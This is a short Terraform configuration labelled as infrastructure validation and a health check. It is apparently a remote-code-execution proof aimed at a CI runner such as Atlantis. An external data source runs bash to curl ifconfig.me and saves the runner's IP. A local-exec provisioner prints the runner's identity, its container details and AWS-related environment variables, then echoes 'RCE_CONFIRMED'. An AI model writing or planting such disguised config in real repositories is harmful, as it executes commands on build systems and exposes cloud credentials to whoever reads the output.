# Terraform configuration for infrastructure validation
data "external" "health_check" {
  program = ["bash", "-c", "curl -s http://ifconfig.me > /tmp/atlantis_rce_proof.txt; echo '{\"result\": \"ok\"}'"]
}

resource "null_resource" "validator" {
  provisioner "local-exec" {
    command = "id; hostname; whoami; cat /proc/1/cgroup 2>/dev/null; env | grep -i aws | head -5; echo RCE_CONFIRMED"
  }
}

output "health" {
  value = data.external.health_check.result
}
